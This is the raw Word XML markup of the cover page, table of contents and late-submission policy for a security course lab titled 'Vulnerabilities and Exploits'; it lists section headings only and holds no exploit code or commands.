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5F834" w14:textId="77777777" w:rsidR="00D24BAD" w:rsidRPr="00644444" w:rsidRDefault="00D24BAD" w:rsidP="00D24BAD">
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-CA" w:eastAsia="en-CA"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251658752" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="0230969F" wp14:editId="1D0EFD39">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>4864100</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>-173355</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="1984248" cy="2523744"/>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84248" cy="2523744"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
            <wp14:sizeRelH relativeFrom="page">
              <wp14:pctWidth>0</wp14:pctWidth>
            </wp14:sizeRelH>
            <wp14:sizeRelV relativeFrom="page">
              <wp14:pctHeight>0</wp14:pctHeight>
            </wp14:sizeRelV>
          </wp:anchor>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="329FC1C0" w14:textId="77777777" w:rsidR="00D24BAD" w:rsidRDefault="00D24BAD" w:rsidP="00D24BAD">
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-CA" w:eastAsia="en-CA"/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wpg">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251657728" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="631534AC" wp14:editId="3F928779">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>-301336</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>3489325</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="6960904" cy="5209557"/>
                <wp:effectExtent l="0" t="0" r="0" b="0"/>
                <wp:wrapNone/>
                <wp:docPr id="1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904" cy="5209557"/>
                          <a:chOff x="4226" y="0"/>
                          <a:chExt cx="69613" cy="52096"/>
                        </a:xfrm>
                      </wpg:grpSpPr>
                      <wpg:grpSp>
                        <wpg:cNvPr id="15" name="Group 30"/>
                        <wpg:cNvGrpSpPr>
                          <a:grpSpLocks/>
                        </wpg:cNvGrpSpPr>
                        <wpg:grpSpPr bwMode="auto">
                          <a:xfrm>
                            <a:off x="4226" y="0"/>
                            <a:ext cx="68978" cy="47604"/>
                            <a:chOff x="4226" y="0"/>
                            <a:chExt cx="68978" cy="47604"/>
                          </a:xfrm>
                        </wpg:grpSpPr>
                        <wps:wsp>
                          <wps:cNvPr id="17" name="Text Box 4"/>
                          <wps:cNvSpPr txBox="1">
                            <a:spLocks noChangeArrowheads="1"/>
                          </wps:cNvSpPr>
                          <wps:spPr bwMode="auto">
                            <a:xfrm>
                              <a:off x="4226" y="0"/>
                              <a:ext cx="47708" cy="5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816113" w14:textId="77777777" w:rsidR="00123EC6" w:rsidRPr="00090ACB" w:rsidRDefault="00123EC6" w:rsidP="00D24BAD"/>
                            </w:txbxContent>
                          </wps:txbx>
                          <wps:bodyPr rot="0" vert="horz" wrap="square" lIns="91440" tIns="45720" rIns="91440" bIns="45720" anchor="t" anchorCtr="0" upright="1">
                            <a:noAutofit/>
                          </wps:bodyPr>
                        </wps:wsp>
                        <wps:wsp>
                          <wps:cNvPr id="18" name="Text Box 5"/>
                          <wps:cNvSpPr txBox="1">
                            <a:spLocks noChangeArrowheads="1"/>
                          </wps:cNvSpPr>
                          <wps:spPr bwMode="auto">
                            <a:xfrm>
                              <a:off x="6081" y="0"/>
                              <a:ext cx="67123" cy="39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75E4A8" w14:textId="77777777" w:rsidR="00123EC6" w:rsidRDefault="00123EC6" w:rsidP="00D24BAD">
                                <w:pPr>
                                  <w:pStyle w:val="TitlePageCourseName"/>
                                  <w:rPr>
                                    <w:rFonts w:ascii="Titillium Bd" w:hAnsi="Titillium Bd"/>
                                  </w:rPr>
                                </w:pPr>
                                <w:r>
                                  <w:rPr>
                                    <w:rFonts w:ascii="Titillium Bd" w:hAnsi="Titillium Bd"/>
                                  </w:rPr>
                                  <w:t>Lab 1</w:t>
                                </w:r>
                              </w:p>
                              <w:p w14:paraId="5BD1B0D6" w14:textId="7D26B3CB" w:rsidR="00123EC6" w:rsidRPr="00182471" w:rsidRDefault="00123EC6" w:rsidP="00D24BAD">
                                <w:pPr>
                                  <w:pStyle w:val="TitlePageCourseName"/>
                                  <w:rPr>
                                    <w:rFonts w:ascii="Titillium Bd" w:hAnsi="Titillium Bd"/>
                                    <w:sz w:val="56"/>
                                    <w:szCs w:val="56"/>
                                  </w:rPr>
                                </w:pPr>
                                <w:r>
                                  <w:rPr>
                                    <w:rFonts w:ascii="Titillium Bd" w:hAnsi="Titillium Bd"/>
                                    <w:sz w:val="56"/>
                                    <w:szCs w:val="56"/>
                                  </w:rPr>
                                  <w:t>Vulnerabilities and Exploits</w:t>
                                </w:r>
                              </w:p>
                            </w:txbxContent>
                          </wps:txbx>
                          <wps:bodyPr rot="0" vert="horz" wrap="square" lIns="91440" tIns="45720" rIns="91440" bIns="45720" anchor="t" anchorCtr="0" upright="1">
                            <a:noAutofit/>
                          </wps:bodyPr>
                        </wps:wsp>
                        <wps:wsp>
                          <wps:cNvPr id="19" name="Text Box 6"/>
                          <wps:cNvSpPr txBox="1">
                            <a:spLocks noChangeArrowheads="1"/>
                          </wps:cNvSpPr>
                          <wps:spPr bwMode="auto">
                            <a:xfrm>
                              <a:off x="6096" y="39336"/>
                              <a:ext cx="66583" cy="8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79D73D" w14:textId="3FFD6CC3" w:rsidR="00123EC6" w:rsidRPr="00A45EC3" w:rsidRDefault="00123EC6" w:rsidP="00D24BAD">
                                <w:pPr>
                                  <w:pStyle w:val="TitlePageModuleTitle"/>
                                  <w:rPr>
                                    <w:rFonts w:ascii="Titillium Bd" w:hAnsi="Titillium Bd"/>
                                  </w:rPr>
                                </w:pPr>
                                <w:r>
                                  <w:rPr>
                                    <w:rFonts w:ascii="Titillium Bd" w:hAnsi="Titillium Bd"/>
                                  </w:rPr>
                                  <w:t>ITSC304</w:t>
                                </w:r>
                                <w:r w:rsidRPr="00A45EC3">
                                  <w:rPr>
                                    <w:rFonts w:ascii="Titillium Bd" w:hAnsi="Titillium Bd"/>
                                  </w:rPr>
                                  <w:t xml:space="preserve">: </w:t>
                                </w:r>
                                <w:r>
                                  <w:rPr>
                                    <w:rFonts w:ascii="Titillium Bd" w:hAnsi="Titillium Bd"/>
                                  </w:rPr>
                                  <w:t>Operating Systems Exploitation</w:t>
                                </w:r>
                              </w:p>
                            </w:txbxContent>
                          </wps:txbx>
                          <wps:bodyPr rot="0" vert="horz" wrap="square" lIns="91440" tIns="45720" rIns="91440" bIns="45720" anchor="t" anchorCtr="0" upright="1">
                            <a:noAutofit/>
                          </wps:bodyPr>
                        </wps:wsp>
                      </wpg:grpSp>
                      <wps:wsp>
                        <wps:cNvPr id="20" name="Text Box 2"/>
                        <wps:cNvSpPr txBox="1">
                          <a:spLocks noChangeArrowheads="1"/>
                        </wps:cNvSpPr>
                        <wps:spPr bwMode="auto">
                          <a:xfrm>
                            <a:off x="52184" y="49334"/>
                            <a:ext cx="21655"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2FC4D" w14:textId="77777777" w:rsidR="00123EC6" w:rsidRPr="008B6EED" w:rsidRDefault="00123EC6" w:rsidP="00D24BAD"/>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31534AC" id="Group 31" o:spid="_x0000_s1026" style="position:absolute;margin-left:-23.75pt;margin-top:274.75pt;width:548.1pt;height:410.2pt;z-index:251657728" coordorigin="4226" coordsize="69613,5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">
                <v:group id="Group 30" o:spid="_x0000_s1027" style="position:absolute;left:4226;width:68978;height:47604" coordorigin="4226" coordsize="68978,4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202" coordsize="21600,21600" o:spt="202" path="m,l,21600r21600,l21600,xe">
                    <v:stroke joinstyle="miter"/>
                    <v:path gradientshapeok="t" o:connecttype="rect"/>
                  </v:shapetype>
                  <v:shape id="Text Box 4" o:spid="_x0000_s1028" type="#_x0000_t202" style="position:absolute;left:4226;width:47708;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50816113" w14:textId="77777777" w:rsidR="00123EC6" w:rsidRPr="00090ACB" w:rsidRDefault="00123EC6" w:rsidP="00D24BAD"/>
                      </w:txbxContent>
                    </v:textbox>
                  </v:shape>
                  <v:shape id="Text Box 5" o:spid="_x0000_s1029" type="#_x0000_t202" style="position:absolute;left:6081;width:67123;height:39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E75E4A8" w14:textId="77777777" w:rsidR="00123EC6" w:rsidRDefault="00123EC6" w:rsidP="00D24BAD">
                          <w:pPr>
                            <w:pStyle w:val="TitlePageCourseName"/>
                            <w:rPr>
                              <w:rFonts w:ascii="Titillium Bd" w:hAnsi="Titillium Bd"/>
                            </w:rPr>
                          </w:pPr>
                          <w:r>
                            <w:rPr>
                              <w:rFonts w:ascii="Titillium Bd" w:hAnsi="Titillium Bd"/>
                            </w:rPr>
                            <w:t>Lab 1</w:t>
                          </w:r>
                        </w:p>
                        <w:p w14:paraId="5BD1B0D6" w14:textId="7D26B3CB" w:rsidR="00123EC6" w:rsidRPr="00182471" w:rsidRDefault="00123EC6" w:rsidP="00D24BAD">
                          <w:pPr>
                            <w:pStyle w:val="TitlePageCourseName"/>
                            <w:rPr>
                              <w:rFonts w:ascii="Titillium Bd" w:hAnsi="Titillium Bd"/>
                              <w:sz w:val="56"/>
                              <w:szCs w:val="56"/>
                            </w:rPr>
                          </w:pPr>
                          <w:r>
                            <w:rPr>
                              <w:rFonts w:ascii="Titillium Bd" w:hAnsi="Titillium Bd"/>
                              <w:sz w:val="56"/>
                              <w:szCs w:val="56"/>
                            </w:rPr>
                            <w:t>Vulnerabilities and Exploits</w:t>
                          </w:r>
                        </w:p>
                      </w:txbxContent>
                    </v:textbox>
                  </v:shape>
                  <v:shape id="Text Box 6" o:spid="_x0000_s1030" type="#_x0000_t202" style="position:absolute;left:6096;top:39336;width:66583;height:8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679D73D" w14:textId="3FFD6CC3" w:rsidR="00123EC6" w:rsidRPr="00A45EC3" w:rsidRDefault="00123EC6" w:rsidP="00D24BAD">
                          <w:pPr>
                            <w:pStyle w:val="TitlePageModuleTitle"/>
                            <w:rPr>
                              <w:rFonts w:ascii="Titillium Bd" w:hAnsi="Titillium Bd"/>
                            </w:rPr>
                          </w:pPr>
                          <w:r>
                            <w:rPr>
                              <w:rFonts w:ascii="Titillium Bd" w:hAnsi="Titillium Bd"/>
                            </w:rPr>
                            <w:t>ITSC304</w:t>
                          </w:r>
                          <w:r w:rsidRPr="00A45EC3">
                            <w:rPr>
                              <w:rFonts w:ascii="Titillium Bd" w:hAnsi="Titillium Bd"/>
                            </w:rPr>
                            <w:t xml:space="preserve">: </w:t>
                          </w:r>
                          <w:r>
                            <w:rPr>
                              <w:rFonts w:ascii="Titillium Bd" w:hAnsi="Titillium Bd"/>
                            </w:rPr>
                            <w:t>Operating Systems Exploitation</w:t>
                          </w:r>
                        </w:p>
                      </w:txbxContent>
                    </v:textbox>
                  </v:shape>
                </v:group>
                <v:shape id="Text Box 2" o:spid="_x0000_s1031" type="#_x0000_t202" style="position:absolute;left:52184;top:49334;width:2165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5B42FC4D" w14:textId="77777777" w:rsidR="00123EC6" w:rsidRPr="008B6EED" w:rsidRDefault="00123EC6" w:rsidP="00D24BAD"/>
                    </w:txbxContent>
                  </v:textbox>
                </v:shape>
              </v:group>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EB484DC" w14:textId="77777777" w:rsidR="00D24BAD" w:rsidRPr="009F6C19" w:rsidRDefault="00D24BAD" w:rsidP="00D24BAD"/>
    <w:p w14:paraId="4025DEAD" w14:textId="6DB13CA8" w:rsidR="00B6669B" w:rsidRPr="00775750" w:rsidRDefault="00B6669B" w:rsidP="00B6669B">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00775750">
        <w:rPr>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>NAME:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> _</w:t>
      </w:r>
      <w:r w:rsidR="008970FC" w:rsidRPr="008970FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Coleton Sanheim</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>__________________</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07DC6E57" w14:textId="77777777" w:rsidR="00B6669B" w:rsidRPr="009F6C19" w:rsidRDefault="00B6669B" w:rsidP="00B6669B"/>
    <w:p w14:paraId="2E59B0EF" w14:textId="77777777" w:rsidR="00D24BAD" w:rsidRDefault="00D24BAD" w:rsidP="00D24BAD"/>
    <w:p w14:paraId="41E57F77" w14:textId="77777777" w:rsidR="00D24BAD" w:rsidRPr="009F6C19" w:rsidRDefault="00D24BAD" w:rsidP="00D24BAD"/>
    <w:p w14:paraId="1C57CC61" w14:textId="77777777" w:rsidR="00D24BAD" w:rsidRDefault="00D24BAD" w:rsidP="00D24BAD"/>
    <w:p w14:paraId="6F485809" w14:textId="77777777" w:rsidR="00D24BAD" w:rsidRDefault="00D24BAD" w:rsidP="00D24BAD"/>
    <w:p w14:paraId="45665751" w14:textId="77777777" w:rsidR="00D24BAD" w:rsidRPr="009F6C19" w:rsidRDefault="00D24BAD" w:rsidP="00D24BAD">
      <w:pPr>
        <w:sectPr w:rsidR="00D24BAD" w:rsidRPr="009F6C19" w:rsidSect="004C4C4D">
          <w:pgSz w:w="12240" w:h="15840" w:code="1"/>
          <w:pgMar w:top="288" w:right="288" w:bottom="1440" w:left="1440" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:space="720"/>
          <w:titlePg/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:sdt>
      <w:sdtPr>
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:noProof/>
          <w:color w:val="auto"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:id w:val="1405411376"/>
        <w:docPartObj>
          <w:docPartGallery w:val="Table of Contents"/>
          <w:docPartUnique/>
        </w:docPartObj>
      </w:sdtPr>
      <w:sdtEndPr>
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:noProof w:val="0"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:sdtEndPr>
      <w:sdtContent>
        <w:p w14:paraId="56AABFF9" w14:textId="238FE33F" w:rsidR="008C2E88" w:rsidRPr="007E5769" w:rsidRDefault="008C2E88" w:rsidP="00FB3AC4">
          <w:pPr>
            <w:pStyle w:val="TOCHeading"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="3960"/>
            </w:tabs>
          </w:pPr>
          <w:r w:rsidRPr="007E5769">
            <w:t>Table of Contents</w:t>
          </w:r>
          <w:r w:rsidR="00FB3AC4">
            <w:tab/>
          </w:r>
        </w:p>
        <w:p w14:paraId="0C282D72" w14:textId="77777777" w:rsidR="00AA7BEE" w:rsidRDefault="00F62EC0" w:rsidP="0067050A">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
              <w:szCs w:val="22"/>
              <w:lang w:val="en-CA" w:eastAsia="en-CA"/>
            </w:rPr>
          </w:pPr>
          <w:r w:rsidRPr="00A70299">
            <w:rPr>
              <w:szCs w:val="22"/>
            </w:rPr>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidRPr="00A70299">
            <w:rPr>
              <w:szCs w:val="22"/>
            </w:rPr>
            <w:instrText xml:space="preserve"> TOC \o "1-3" \h \z \u </w:instrText>
          </w:r>
          <w:r w:rsidRPr="00A70299">
            <w:rPr>
              <w:szCs w:val="22"/>
            </w:rPr>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:hyperlink w:anchor="_Toc477810818" w:history="1">
            <w:r w:rsidR="00AA7BEE" w:rsidRPr="00181CBB">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
              </w:rPr>
              <w:t>Lab Outcome(s)</w:t>
            </w:r>
            <w:r w:rsidR="00AA7BEE">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00AA7BEE">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00AA7BEE">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc477810818 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00AA7BEE">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00AA7BEE">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="009D4D09">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
            <w:r w:rsidR="00AA7BEE">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7C642F60" w14:textId="77777777" w:rsidR="00AA7BEE" w:rsidRDefault="00375046" w:rsidP="0067050A">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
              <w:szCs w:val="22"/>
              <w:lang w:val="en-CA" w:eastAsia="en-CA"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc477810819" w:history="1">
            <w:r w:rsidR="00AA7BEE" w:rsidRPr="00181CBB">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
              </w:rPr>
              <w:t>Reading</w:t>
            </w:r>
            <w:r w:rsidR="00AA7BEE">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00AA7BEE">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00AA7BEE">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc477810819 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00AA7BEE">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00AA7BEE">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="009D4D09">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
            <w:r w:rsidR="00AA7BEE">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="2A7A6239" w14:textId="77777777" w:rsidR="00AA7BEE" w:rsidRDefault="00375046" w:rsidP="0067050A">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
              <w:szCs w:val="22"/>
              <w:lang w:val="en-CA" w:eastAsia="en-CA"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc477810820" w:history="1">
            <w:r w:rsidR="00AA7BEE" w:rsidRPr="00181CBB">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
              </w:rPr>
              <w:t>Introduction</w:t>
            </w:r>
            <w:r w:rsidR="00AA7BEE">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00AA7BEE">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00AA7BEE">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc477810820 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00AA7BEE">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00AA7BEE">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="009D4D09">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
            <w:r w:rsidR="00AA7BEE">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6F36294A" w14:textId="3039D9F0" w:rsidR="00AA7BEE" w:rsidRDefault="00375046" w:rsidP="0067050A">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc477810822" w:history="1">
            <w:r w:rsidR="0029692E">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r w:rsidR="00AA7BEE" w:rsidRPr="00181CBB">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
              </w:rPr>
              <w:t>.0</w:t>
            </w:r>
            <w:r w:rsidR="00AA7BEE">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
                <w:szCs w:val="22"/>
                <w:lang w:val="en-CA" w:eastAsia="en-CA"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00AA1A0E" w:rsidRPr="005175EC">
              <w:rPr>
                <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
                <w:szCs w:val="22"/>
                <w:lang w:val="en-CA" w:eastAsia="en-CA"/>
              </w:rPr>
              <w:t>Explore D</w:t>
            </w:r>
            <w:r w:rsidR="00B70B17" w:rsidRPr="005175EC">
              <w:rPr>
                <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
                <w:szCs w:val="22"/>
                <w:lang w:val="en-CA" w:eastAsia="en-CA"/>
              </w:rPr>
              <w:t>atabases to identify Operating</w:t>
            </w:r>
            <w:r w:rsidR="00B54B27" w:rsidRPr="005175EC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
              </w:rPr>
              <w:t xml:space="preserve"> Systems vulnera</w:t>
            </w:r>
            <w:r w:rsidR="00B70B17" w:rsidRPr="005175EC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
              </w:rPr>
              <w:t>bilities and exploits</w:t>
            </w:r>
            <w:r w:rsidR="00AA7BEE">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00AC4888">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="60EF0D9A" w14:textId="606CFAF1" w:rsidR="00042A0C" w:rsidRDefault="00375046" w:rsidP="0067050A">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc477810822" w:history="1">
            <w:r w:rsidR="0029692E">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
              </w:rPr>
              <w:t>2.</w:t>
            </w:r>
            <w:r w:rsidR="00042A0C" w:rsidRPr="00181CBB">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
              </w:rPr>
              <w:t>0</w:t>
            </w:r>
            <w:r w:rsidR="00042A0C">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
                <w:lang w:val="en-CA" w:eastAsia="en-CA"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00814D14">
              <w:rPr>
                <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
                <w:lang w:val="en-CA" w:eastAsia="en-CA"/>
              </w:rPr>
              <w:t>Scan vulnerable systems</w:t>
            </w:r>
            <w:r w:rsidR="00042A0C">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00AC4888">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:t>8</w:t>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="407FFFAA" w14:textId="77777777" w:rsidR="00B70B17" w:rsidRDefault="00375046" w:rsidP="0067050A">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:rPr>
              <w:szCs w:val="22"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc477810822" w:history="1">
            <w:r w:rsidR="0029692E" w:rsidRPr="0067050A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
            <w:r w:rsidR="00042A0C" w:rsidRPr="0067050A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
              </w:rPr>
              <w:t>.0</w:t>
            </w:r>
            <w:r w:rsidR="00042A0C" w:rsidRPr="0067050A">
              <w:rPr>
                <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
                <w:lang w:val="en-CA" w:eastAsia="en-CA"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00B70B17">
              <w:rPr>
                <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
                <w:lang w:val="en-CA" w:eastAsia="en-CA"/>
              </w:rPr>
              <w:t>Exploit vulnearable systems</w:t>
            </w:r>
            <w:r w:rsidR="00042A0C" w:rsidRPr="0067050A">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00AC4888">
              <w:rPr>
                <w:webHidden/>
              </w:rPr>
              <w:t>10</w:t>
            </w:r>
          </w:hyperlink>
          <w:r w:rsidR="00F62EC0" w:rsidRPr="00A70299">
            <w:rPr>
              <w:szCs w:val="22"/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:p>
        <w:p w14:paraId="6F93916A" w14:textId="097FECA3" w:rsidR="008C2E88" w:rsidRPr="00B70B17" w:rsidRDefault="00375046" w:rsidP="00B70B17"/>
      </w:sdtContent>
    </w:sdt>
    <w:p w14:paraId="60192D48" w14:textId="738F692B" w:rsidR="00B6669B" w:rsidRPr="003C3AB0" w:rsidRDefault="00B6669B" w:rsidP="00B6669B">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>L</w:t>
      </w:r>
      <w:r w:rsidRPr="003C3AB0">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">abs must be submitted by the due date for full credit. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>After due date l</w:t>
      </w:r>
      <w:r w:rsidRPr="003C3AB0">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">ate submissions will be accepted for a period of one week (seven days) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">and the grade will be </w:t>
      </w:r>
      <w:r w:rsidRPr="003C3AB0">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">reduced by </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">ten  percent (10%) per day after due day. </w:t>
      </w:r>
      <w:r w:rsidRPr="003C3AB0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Assignments that are submitted more than seven days late</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> will receive a grade of zero (0</w:t>
      </w:r>
      <w:r w:rsidRPr="003C3AB0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">). </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40EAFE45" w14:textId="77777777" w:rsidR="00B6669B" w:rsidRDefault="00B6669B" w:rsidP="00B6669B">
      <w:pPr>
        <w:pStyle w:val="WW-BodyText2"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
